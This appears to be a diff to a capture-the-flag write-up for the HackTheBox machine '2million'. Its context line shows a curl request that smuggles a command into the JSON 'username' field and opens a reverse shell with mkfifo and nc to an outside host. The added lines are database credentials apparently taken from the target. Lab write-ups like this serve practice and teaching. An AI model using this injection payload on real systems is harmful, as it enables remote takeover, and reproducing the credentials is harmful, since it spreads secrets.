@@ -49,3 +49,8 @@ Needed to use command injection to to enter the shell:
 
 ``curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=uunul7pqq66sstr9cvdjn3jiad"  --header "Content-Type: application/json" --data '{"username":"test && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 4444 >/tmp/f # "}'``
 
+
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
